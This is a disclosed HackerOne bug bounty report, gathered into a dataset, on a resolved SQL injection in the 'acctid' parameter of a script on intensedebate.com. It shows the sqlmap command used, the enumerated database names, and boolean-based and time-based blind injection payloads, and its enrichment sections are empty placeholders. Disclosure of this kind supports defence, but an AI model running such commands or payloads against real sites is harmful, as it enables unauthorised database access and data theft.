---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1069561'
original_report_id: '1069561'
title: SQL Injection  intensedebate.com
weakness: SQL Injection
team_handle: automattic
created_at: '2021-01-01T06:11:37.364Z'
disclosed_at: '2021-01-11T13:29:03.192Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 89
asset_identifier: intensedebate.com
asset_type: URL
max_severity: medium
tags:
- hackerone
- sql-injection
---

# SQL Injection  intensedebate.com

## Metadata

- HackerOne Report ID: 1069561
- Weakness: SQL Injection
- Program: automattic
- Disclosed At: 2021-01-11T13:29:03.192Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

hello dear support

I have found SQL Injection on intensedebate.com
parameters injectable ?acctid=1
URL:https://www.intensedebate.com/js/importStatus.php?acctid=1

I'm used sqlmap to injection 
command 
sqlmap --url https://www.intensedebate.com/js/importStatus.php?acctid=1 --dbs
{F1140562}

available databases [3]:
[*] heartbeat
[*] id_comments
[*] information_schema

Parameter: acctid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: acctid=1 AND 1726=1726

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: acctid=1 AND (SELECT 8327 FROM (SELECT(SLEEP(5)))yrDl)

## Impact

An attacker can use SQL injection it to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
